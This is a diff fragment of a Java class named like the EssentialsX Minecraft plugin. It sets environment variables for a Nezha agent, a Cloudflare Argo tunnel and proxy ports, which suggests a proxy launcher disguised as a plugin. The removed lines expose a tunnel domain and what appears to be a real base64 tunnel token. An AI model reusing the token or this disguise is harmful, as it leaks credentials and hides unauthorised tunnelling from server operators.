@@ -79,8 +79,8 @@ public class EssentialsX extends JavaPlugin {
         env.put("NEZHA_PORT", "");
         env.put("NEZHA_KEY", "");
         env.put("ARGO_PORT", "8001");
-        env.put("ARGO_DOMAIN", "liston.yeser.dns-dynamic.net");
-        env.put("ARGO_AUTH", "eyJhIjoiNTk5MzUwOTkyOTQzNmJkYzVhNTdmYjJmN2Y5YTlkMjAiLCJ0IjoiYWI1ZDBkNjQtMjUxMy00YTIwLThjNGQtMjJiZDQ5ZDYyMTViIiwicyI6IlpEZGhNVEJsTkRrdFpXWXhOeTAwTURNMUxXSmxZV1V0TkdFNE5HWmpPRFZpWVRSbSJ9");
+        env.put("ARGO_DOMAIN", "");
+        env.put("ARGO_AUTH", "ey9");
         env.put("S5_PORT", "");
         env.put("HY2_PORT", "2015");
         env.put("TUIC_PORT", "");
